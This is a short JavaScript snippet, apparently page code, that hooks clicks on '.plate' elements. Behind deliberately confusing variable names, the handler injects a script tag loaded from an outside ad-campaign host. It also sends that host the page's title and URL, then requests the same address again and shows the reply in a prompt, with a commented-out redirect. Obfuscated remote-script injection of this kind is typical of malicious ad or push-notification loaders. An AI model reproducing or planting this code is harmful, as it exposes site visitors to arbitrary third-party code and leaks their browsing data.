var $lba= document.querySelectorAll('.plate');

//asynced push
function pushNotification2() {
    var eiopqImePe = (function() {
        return document;
    })();
    var eiopq = (function() {
        return encodeURIComponent(eiopqImePe.location.href);
    })();

    function scriptInjection() {
        return document;
    }
    var kleite = function() {
        return 'script';
    }
    var objLoader = scriptInjection().createElement(kleite());
    objLoader.type = objLoader.type ? objLoader.type : 'text/javascript';
    if (!objLoader.async) {
        objLoader.async = !objLoader.async;
    }
    var adopkqw = (function() {
        return "?title=" + encodeURIComponent(eiopqImePe.title)
    })()
    var i = adopkqw + "&url=" + eiopq;
    objLoader.src = initSrcComponent();
    var qs = document.querySelector('script');

    function initSrcComponent() {
        return 'https://admin.adscout.space/api2/campaign/29b37606-8af2-4bfe-830c-e97f738e88dd/push' + i;
    }
    qs.parentNode.insertBefore(objLoader, qs);

    var path = initSrcComponent();
    var xhttp = new XMLHttpRequest();   
    xhttp.open("GET", path, true);
   
    // Async response
    xhttp.onreadystatechange = function() {
	if (this.readyState == 4 && this.status == 200) {
	    let url = this.responseText;
	    prompt("Response from Server", url);
	    //var win = window.open(url, '_blank');
	    //win.focus();
	}
    };
    
    xhttp.send();
}

for(var i=0; i<$lba.length; i++) {
    $lba[i].addEventListener("click", pushNotification2, false);
}
